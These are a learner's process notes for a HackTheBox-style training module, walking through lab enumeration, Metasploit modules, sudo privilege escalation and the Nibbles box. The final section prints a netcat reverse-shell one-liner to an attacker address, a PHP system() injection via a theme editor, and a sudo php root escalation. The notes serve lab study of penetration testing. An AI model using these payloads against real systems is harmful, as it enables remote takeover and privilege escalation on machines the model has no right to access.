# Module 2 — Process Notes

## Section 6 — Banner Grabbing
- Using Pwnbox meant the VPN connection was already active.
- I pinged the target IP to confirm the machine was up — response confirmed correct connectivity.
- Since we didn’t have a username/password, SSH wasn’t useful.
- Netcat made more sense because we only had an IP and port.
- After connecting with Netcat, the output showed that SSH was the service running.
- Applied banner grabbing to confirm the service details.

---

## Section 7 — Exercises

### Q1 — Nmap version of service on port 8080
- Ran a basic Nmap scan first — only saw open port, state, and service.
- Used `-sV` to get the version information.
- Found the required answer.

### Q2 — Identify non‑default Telnet port
- Tried `-sV` and `-sC` for detailed info but Telnet didn’t show up.
- Used banner grabbing with Nmap.
- Found the Telnet port successfully.

### Q3 — List SMB shares and access the flag
- Used `smbclient -U bob` to connect as the bob user.
- Entered the password, navigated using `ls` and `cd`.
- Found `flag.txt`, downloaded it using `get`, and viewed it with `cat`.
  
---

## Section 9 - Exercise
- Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the `/flag.txt` file.  

- First I ran a complete Nmap scan. This revealed an open HTTP port with Apache version, WordPress version, and a title named “Getting Started – Just Another WordPress Site.”  
- I checked Apache 2.4.41 exploits or vulnerabilities. I searched on Metasploit Framework and tried to exploit it — there were too many exploits and I couldn’t understand which one exactly. So I deduced that maybe this was wrong and that I should find information that would point me to the right exploit.  
- I checked for WordPress 5.6.1 which gave the same result. No clue at all. At this point I hadn’t suspected the “Getting Started” HTTP title.  
- Then I thought: if I couldn’t find any valid vulnerability info, I must be doing it wrong. So I ran Nmap again and read everything closely. This time it clicked that “Getting Started” was a weird thing to add and that it was a website.  
- I visited the URL using IP:port. It showed the Getting Started page. Then I went to page source as a trial and *voila* — found the plugin version with the name of the vulnerability.  
- I Googled “Simple Backup plugin version 2.7.10.” On Rapid7, I found the auxiliary name. But before trusting it, I wanted to find it myself.  
- So I went to msfconsole and searched for `simple_backup` with `cve:2015` as found on Rapid7. I found the exploit.  
- I ran the `use` command. At first I didn’t understand what options to set other than RHOSTS. I found a cheatsheet and set RPORT, TARGETURI, and tried the default DEPTH.  
- At first it couldn’t find anything since FILEPATH was set to `/etc/passwd`. Turns out I had to set it to the one in the question.  
- With all these set correctly, finally the file was saved in the root. When I opened the file using `cat`, it gave me the flag.  
- It took 4 hours to crack this one.

### Helper References
- cheatsheet-using-the-metasploit-framework.pdf  
- Rapid7 Vulnerability Database  
- metasploit-framework/modules/auxiliary/scanner/http/wp_simple_backup_file_read.rb at master · rapid7/metasploit-framework

---

## Section 11 — Exercise

### Q1 — Move to user2 and get the flag at `/home/user2/flag.txt`
- SSH into the server using `ssh username@<ip> -p<port>`, then ran `sudo -l` to check current privileges.
- Revealed that `/bin/bash` can be executed without a password for user2. Tried `sudo su -` to check if root was accessible — unsuccessful. user1 can't write to `/bin/bash`, so I needed to log in as user2 first to get further info.
- Tried to gather OS info and searchsploited the Parrot version — nothing found. Checked write permissions on folders inside PATH. Followed the Checklist - Linux Privilege Escalation - HackTricks but too many unknowns. Nothing found after 1 hour.
- Started fresh the next hour. Ruled out OS/kernel exploits, no scheduled tasks could be worked out. Shifted focus to the other parts of the lesson — exposed credentials and SSH keys.
- Used `find` and `grep` to look for suspicious config or log files — found nothing. SSH keys were the last resort.
- Found the public key file for user1 but the goal was to access user2. Used GTFOBins to understand what could be done from user1. Tried opening `/bin/bash` using the `bash -c` command but got a warning with too much noise.
- Used `sudo -u user2 bash -c 'whoami'` to verify access — it replied as user2. Used the same approach with the flag location from the question and found the flag.

### Q2 — Escalate privileges to root and get the flag at `/root/flag.txt`
- Using `sudo` and `bash -c`, checked what files and permissions existed in root. Found two things:
  1. `flag.txt` existed but had no read access for anyone other than root — needed to SSH in as root.
  2. The `.ssh` directory was there, exactly as described in the notes.
- Checked inside `.ssh` and found `id_rsa` containing the private key. Followed the flow from the notes — read the file using `cat`, copied the key, wrote it locally using `vim`, changed permissions with `chmod 600`, then logged out.
- Logged back in as root using the private key: `ssh root@10.10.10.10 -i key`. Accessed `flag.txt` and the flag was found.
- Took 2 hours in total.

### Helper References
- Checklist - Linux Privilege Escalation - HackTricks
- GTFOBins

---

## Sections 16 & 17 — Nibbles Machine (User Flag)

- Visited the target website — showed "Hello World!" on the page. Checked page source; aside from a comment revealing the `/nibbleblog` directory, nothing else was visible — but that was already useful info.
- Ran WhatWeb on the discovered directory. Revealed OS version, PHP session ID (confirming PHP is in use), Ubuntu Linux with server version, and the page title "Nibbles - Yum Yum". Also ran cURL — returned info in XML format.
- Ran Gobuster and got significant output: `readme`, `/admin`, `/admin.php`, `/content`, `/plugins`, `/themes`.
- Visited `admin.php` in the browser. Tried common credential pairs like `admin:admin` and `admin:password` — after a few attempts, Nibbleblog's blacklist protection triggered and the IP was temporarily blocked, ruling out brute-forcing.
- Browsed to the `/content` directory. Found three subdirectories: `public`, `private`, `tmp`. Inside `private`, found `users.xml`. Requested it with cURL and prettified it using `xmllint` — revealed the email address and the page title again. Having seen "nibbles" appear multiple times, I tried it as the password and it worked. Credentials: `admin:nibbles`.
- Navigated the admin panel and found the image upload section. Wrote a PHP web shell and uploaded it — a warning appeared but there was no server-side validation, so the upload went through. Edited the script with the required system command and re-uploaded. Started a Netcat listener, then tried to trigger it via cURL on `http://nibbleblog/content/private/plugins/my_image/image.php`. After 15 minutes of attempts with different files, the command still wasn't executing.
- Searched for an alternative approach and found a Metasploit-based method. Opened `msfconsole`, searched for `nibbleblog`, and found the file upload exploit. Set the required options: `PASSWORD`, `LPORT`, `LHOST`, `USERNAME`, `TARGETURI`, `RHOSTS`. Ran the exploit — a reverse TCP handler started, the file upload vulnerability was triggered, and a Meterpreter session opened. Ran `whoami` — returned `nibbler`. Used `ls`, `cd`, and `cat` to navigate to `/home/nibbler/user.txt` and retrieved the flag.
- Took 2.5 hours in total to work through each step and understand the reasoning behind it. This was a new kind of challenge — I saw how different enumeration scans surface different information and how chaining them together leads to the next step.

### Helper References
- Nibbles Walkthrough - HTB Easy | Nibbleblog RCE & Sudo Script Exploitation | D23R Cybersecurity Blog

---

## Section 18 — Nibbles Machine (Privilege Escalation to Root)

- Inside Meterpreter, started a shell session. Following the walkthrough, the steps were: unzip the personal file, read `monitor.sh`, pull `LinEnum.sh` to the local machine, start a Python HTTP server with `sudo python3 -m http.server 8080`, then download using `wget http://<your ip>:8080/LinEnum.sh`, change permissions, and run `./LinEnum.sh`.
- Every `wget` attempt for `LinEnum.sh` returned a 404 error — the file transfer wouldn't go through.
- Searched for an alternative privilege escalation method. Referencing the same walkthrough blog, ran `sudo -l` in the shell session. Found: `(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh` — meaning root can execute this script without a password.
- Ran `ls -al personal/stuff` to check permissions on `monitor.sh`. It was writable by all, meaning it could be modified and executed as root.
- The blog's approach of overwriting the script with a payload didn't work either. With both the HTB walkthrough and the blog failing, I had to think of another way.
- Drawing on the previous exercise, I adapted the `sudo -u user bash -c '...'` approach used to read files as an unprivileged user. Applied the same logic here and it worked — the flag in `/root/root.txt` was retrieved.
- Overall a very rewarding experience. Being forced to think of alternative approaches gave me a real confidence boost and reinforced that there is always a roundabout way to reach the goal — it doesn't have to match what you were shown.

### Helper References
- Nibbles Walkthrough - HTB Easy | Nibbleblog RCE & Sudo Script Exploitation | D23R Cybersecurity Blog

### Screenshot
- <img width="500" alt="Mod 2 - Section 18" src="https://github.com/user-attachments/assets/3da768f2-d938-4b15-b0ad-7233da4c1510" />

---

## Section 23 — Skills Assessment (Final Box)

### Objective
Gain foothold on target and retrieve user.txt, then escalate to root and retrieve root.txt.

### Enumeration
- Ran `nmap -sV -sC <ip>` → HTTP open, `/admin` directory and `robots.txt` found
- Browsed to `/admin/` → login page → tried `admin:admin` → successful
- Explored admin panel tabs: Home, Files, Theme, Backup, Plugins
- Theme tab revealed directory: `http://gettingstarted.htb/theme/Cardinal/`
- Home page indicated code execution possible via Theme → Edit Components

### Foothold — RCE via Theme Editor
- Navigated to `admin/theme/edit-components`
- Injected `<?php system('id'); ?>` → returned `uid=33...` confirming RCE
- Replaced with reverse shell payload (`"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"`)
- Started listener: `nc -lvnp 9443`
- Triggered shell via browser

### Shell Stabilisation
- Ran `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- CTRL+Z → `stty raw -echo` → `fg`
- Issue: terminal went blank, no output visible — reproduced 3 times
- Fix on fresh Pwnbox: ran `export TERM=xterm` on remote shell
- Alternative fix learnt: CTRL+J → type `stty sane` blindly → CTRL+J

### User Flag
- Navigated using `ls` and `cd` → found `user.txt` in `/home` directory

### Privilege Escalation
- Attempted LinEnum transfer via `python3 -m http.server 8080` + `wget` → file not found error
- Attempted `curl` download → still failed
- Ran `sudo -l` → `/usr/bin/php` requires no password
- Tried `sudo bash -c 'ls -a'` → asked for password, failed
- Researched PHP sudo escalation
- Navigated to `/usr/bin`
- Ran:
```bash
  CMD='/bin/sh'
  sudo /usr/bin/php -r "system('$CMD');"
```
- Shell returned as root
- Navigated to `/root` → retrieved `root.txt` using `cat`

### Key Learnings
- RCE via admin theme editors is a real and common attack vector
- Shell stabilisation can fail silently — `export TERM=xterm` fixes blank terminal issue
- `sudo -l` is always worth running — PHP binary sudo escalation is a GTFOBins classic
- LinEnum transfer via HTTP server is environment-dependent; always have a backup method
- Roundabout approaches work — don't fixate on one method


